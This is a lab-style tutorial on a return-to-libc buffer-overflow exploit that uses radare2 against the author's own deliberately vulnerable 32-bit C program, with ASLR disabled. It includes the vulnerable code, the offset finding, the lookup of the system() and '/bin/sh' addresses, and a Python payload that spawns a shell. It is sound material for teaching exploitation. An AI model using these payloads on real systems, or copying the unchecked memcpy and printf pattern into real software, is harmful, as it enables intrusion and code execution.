## Return-to-libc with radare2 with no ASLR ##

The exploit is based on the descriptions by Saif El-Sherei: <https://www.exploit-db.com/docs/28553.pdf>.
Read this pdf for details on how return to libc works in detail.
This document focuses on using radare2 for the exploit.

### Compiling ###

```
% cat bufoverflow.c                             :(
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
    char buf[256];
    memcpy(buf, argv[1],strlen(argv[1]));
    printf(buf);
}
% gcc -m32 -mpreferred-stack-boundary=2 bufoverflow.c -o bufoverflow
```

The idea is to overwrite the return address of the main function with a function address we took from the libc.

We compile a 32 bit binary to make the task easier, because otherwise the function addresses we need to pass would contain zeros, and `strlen` would return a smaller number of chars than we initially wanted to `memcpy`.
Furthermore, with `-mpreferred-stack-boundary=2` we tell GCC to align the stack to a 4-byte boundary.
If we specified  `-mpreferred-stack-boundary=4`, the stack would be aligned to a 16-byte boundary, which would change the amount of A's we need to pass to the binary to be exploited.

Furthermore, we have to deactivate the ASLR. To do this system-wide, zero has to be written to the right proc file.
```
% echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### Finding the right offset ###

The buffer is 256 chars wide. The frame pointer (ebp) is pushed to the stack as part of the function prologue, which adds another 4 byte. Furthermore, ebx (4 byte again) is saved by gcc as a callee-saved register.

```
0x08048466      55             push ebp
0x08048467      89e5           mov ebp, esp
0x08048469      53             push ebx
0x0804846a      81ec00010000   sub esp, 0x100
```

In sum, we have to pass 264 random chars (usually A's are used) to the program, followed by the 4 byte of new return address we want to overwrite the original address with.

```
% ./bufoverflow `python -c "print 'A'*260"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%
```

When passing 268 A's, the return address is overwritten. We can check that using the linux tool `strace`.

```
% strace ./bufoverflow `python -c "print 'A'*268"` 
....
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
+++ killed by SIGSEGV +++
[1]    9950 segmentation fault  strace -f ./bufoverflow `python -c "print 'A'*268"`
```

### Finding the symbol addresses ###

Basically, we want to execute `system("/bin/sh")`, using the symbols we already have in the libc.
Therefore, we want to put the following data on the stack.

```
| 264 garbage-A's | addr_system | 4 byte garbage | addr_string_bin_sh |
```

First we need to find the address of the function `system()` and the string `/bin/sh` in the libc.
We start radare2 in debug mode (`radare2 -d PROGNAME`).

```
% radare2 -d bufoverflow
Process with PID 7286 started...
= attach 7286 7286
bin.baddr 0x56555000
Using 0x56555000
asm.bits 32
Continue until 0x5655557d using 1 bpsize
hit breakpoint at: 5655557d
```

In radare2, `-d PROGNAME PROGARGS` has to be the last option passed, since otherwise the following arguments are interpreted as arguments to the program to be debugged instead of to radare2.

The program arguments can also be passed inside of radare2 using the command `> ood foo`.


The command `dcu main` (debug continue until) executes the program until main is reached. In that manner, we can be sure that the libraries are already loaded when we want to analyze them.
Or you just put `e dbg.bep=main` into your `~/.radare2rc`, so that each program started in debug mode will break when `main()` is reached.

Next, we search for the address of the function `system` (dmi = debug memory).
```
[0x5655557d]> dmi libc system
vaddr=0xf7efcd70 paddr=0x00113d70 ord=246 fwd=NONE sz=68 bind=GLOBAL type=FUNC name=svcerr_systemerr
vaddr=0xf7e23b40 paddr=0x0003ab40 ord=628 fwd=NONE sz=55 bind=GLOBAL type=FUNC name=__libc_system
vaddr=0xf7e23b40 paddr=0x0003ab40 ord=1461 fwd=NONE sz=55 bind=WEAK type=FUNC name=system
```
The syntax is `dmi LIB_NAME SYMBOL_NAME`.
The `system()` address in my case is 0xf7e23b40.

_In my case, and error code 1 was returned in radare2 when searching symbols in the library. The solution was to copy the binary to another directory. No idea, why that worked._
```
[0xf7e67b06]> dmi libc system
error code 1
```

Next, we search for the address of the string "/bin/sh" in the libc.
The radare2 command for searching strings is `/ STRING`.
To search the string starting from a certain address, execute `/ STRING @ address`.
```
[0x5655557d]> dmi
0x56555000 /tmp/bufoverflow
0xf7de9000 /lib/i386-linux-gnu/libc-2.24.so
0xf7fd9000 /lib/i386-linux-gnu/ld-2.24.so
[0x5655557d]> / /bin/sh @0xf7de9000
Searching 7 bytes from 0x00000000 to 0xffffffffffffffff: 2f 62 69 6e 2f 73 68
Searching 7 bytes in [0xf7de9000-0xf7f9a000]
hits: 1
0xf7f45dc8 hit0_0 .b/strtod_l.c-c/bin/shexit 0canonica.
```

An equivalent chain of commands is seeking to the address where the libc is mapped and performing the string search there.
```
[0x5655557d]> s 0xf7de9000
[0xf7de9000]> / /bin/sh
Searching 7 bytes from 0x00000000 to 0xffffffffffffffff: 2f 62 69 6e 2f 73 68
Searching 7 bytes in [0xf7de9000-0xf7f9a000]
hits: 1
0xf7f45dc8 hit2_0 .b/strtod_l.c-c/bin/shexit 0canonica.
```

The address of the string is therefore `0xf7f45dc8`.

### Scripting the input ###
With a python script we can construct the input and directly pass it to the binary.

```
% cat input.py
import struct

addr_shellstr=struct.pack("<I", 0xf7f45dc8)
addr_sys=struct.pack("<I", 0xf7e23b40)

print 'A'*264+addr_sys+'D'*4+addr_shellstr
```

```
% ./bufoverflow `python input.py`
$
```

We can also directly pass the input the binary.
```
% ./bufoverflow `python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@;\xe2\xf7DDDD\xc8]\xf4\xf7'"`
```

The reason why we have to use python here is that otherwise the shell is interpreting the hex values and they don't get passed to the binary.
